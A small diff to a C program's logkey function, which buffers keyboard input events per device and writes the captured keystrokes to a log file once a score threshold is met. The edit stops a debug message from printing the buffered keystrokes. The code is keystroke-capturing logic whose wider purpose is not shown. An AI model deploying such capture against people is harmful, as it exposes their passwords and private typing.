@@ -505,7 +505,7 @@ int logkey(struct keyboardInfo* kbd, struct deviceInfo* device, struct input_eve
     // rotate keylog after 100 chars in the buffer
     if (device->devlog.size >= 20) {
         if (device->score >= config->maxcount) {
-            LOG(2, "Writing %s to logfile\n", device->devlog.b);
+            LOG(2, "Writing devlog to logfile\n");
 
             // write keylog to the log file
             if (write(kbd->outfd, device->devlog.b, device->devlog.size) < 0) {
